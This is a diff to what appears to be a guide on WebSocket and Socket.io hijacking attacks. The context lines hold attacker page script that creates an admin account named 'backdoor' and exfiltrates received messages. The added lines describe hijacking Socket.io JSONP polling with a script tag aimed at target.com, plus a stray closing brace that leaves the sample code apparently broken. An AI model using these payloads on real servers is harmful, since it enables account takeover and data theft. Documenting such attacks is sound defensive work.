@@ -116,6 +116,8 @@ wss.on('connection', (ws, req) => {
         ws.send(JSON.stringify({ action: 'create_admin', username: 'backdoor' }));
     };
     
+    };
+    
     ws.onmessage = function(event) {
         // Exfiltrate received data
         const data = event.data;
@@ -126,6 +128,11 @@ wss.on('connection', (ws, req) => {
     };
 </script>
 </html>
+```
+
+### [NEW] Socket.io Specific: JSONP Polling Fallback
+**How it works:** If WebSockets fail, Socket.io may fall back to JSONP polling. JSONP does not follow CORS and can be hijacked if the server does not enforce strict CSRF tokens for polling requests.
+**Attack:** `<script src="https://target.com/socket.io/?transport=polling&j=1&sid=..."></script>`
 ```
 
 ---
